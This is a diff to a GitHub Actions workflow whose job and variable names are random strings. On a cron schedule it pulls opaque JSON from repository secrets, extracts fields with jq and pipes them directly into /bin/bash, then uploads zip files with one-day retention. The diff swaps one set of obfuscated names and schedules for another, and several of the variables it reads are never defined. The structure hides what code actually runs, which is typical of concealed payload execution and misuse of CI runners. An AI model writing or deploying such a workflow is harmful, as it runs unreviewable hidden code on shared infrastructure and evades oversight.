@@ -1,26 +1,26 @@
 name: kylemonolith128
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '12 1/6 * * *'
 
+  schedule:
+    - cron: '20 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kylemonolith128
         env:
-          a0: ${{ secrets.a0 }}
+          uea2492: ${{ secrets.uea2492 }}
         run: |
-          echo $a0 | jq -r .h246 | /bin/bash
-          echo $aedy884 | jq -r .zt9361 | /bin/bash
-          echo $qmrds112 | jq -r .f8 | /bin/bash
-          echo $qgk7 | jq -r .gl4 | /bin/bash
-          echo $noy2 | jq -r .ukjk17240 | /bin/bash
-          echo $cevdb404 | jq -r .rh5 | /bin/bash
-          echo $tgui87 | jq -r .nky5067 | /bin/bash
-          echo $d92 | jq -r .ox53299 | /bin/bash
-          echo $oe6438 | jq -r .bmebw055 | /bin/bash
+          printf '%s' "$uea2492" | jq -r .tkne95950 | /bin/bash
+          printf '%s' "$r5144" | jq -r .gmjt7507 | /bin/bash
+          echo $t109 | jq -r .pfuc9 | /bin/bash
+          echo $xvy924 | jq -r .sfvre02239 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9Jafuqj0
+          path: "*.zip"
+          retention-days: 1
